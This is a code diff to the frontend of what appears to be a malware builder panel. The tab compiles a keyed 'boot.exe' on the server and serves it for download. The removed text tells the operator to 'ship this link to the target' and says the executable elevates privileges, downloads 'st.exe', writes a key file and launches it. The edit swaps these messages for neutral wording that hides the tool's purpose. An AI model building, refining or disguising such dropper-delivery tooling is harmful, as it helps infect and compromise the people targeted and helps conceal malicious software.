@@ -1,5 +1,5 @@
 // language: JavaScript, file: public/js/builder.js
-// builder tab — key field is the only input. server compiles boot.exe with the key baked in.
+// builder tab — key field, build button, builds list. no launch options.
 
 (function () {
   'use strict';
@@ -67,8 +67,8 @@
     const key = ($('b-key')?.value || '').trim();
 
     btn.disabled = true;
-    btn.textContent = 'compiling… (30–90s)';
-    out.innerHTML = '<div class="note">cargo build running on server — first build 2–3 min, after that 30–90s</div>';
+    btn.textContent = 'building…';
+    out.innerHTML = '<div class="note">compiling on server — first build takes 2–3 min, after that ~30s</div>';
 
     try {
       const r = await fetch('/api/build', {
@@ -84,15 +84,12 @@
       } else {
         out.innerHTML = `
           <div class="tile">
-            <div class="k">build ready — key baked into boot.exe</div>
+            <div class="k">build ready — key compiled in</div>
             <div class="v mono" style="font-size:13px;margin-top:8px">${esc(d.key)}</div>
             <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
               <button class="ghost mini" id="b-dl-now">download boot.exe</button>
             </div>
-            <div class="note">
-              live url: <code style="color:var(--accent);font-family:var(--mono)">${esc(d.liveUrl)}</code><br>
-              ship this link to the target. boot.exe elevates, downloads st.exe, writes key.json, launches.
-            </div>
+            <div class="note">live url: <code style="color:var(--accent);font-family:var(--mono)">/api/downloads/boot.exe</code></div>
           </div>`;
         document.getElementById('b-dl-now')?.addEventListener('click', () => {
           window.location.href = d.url;
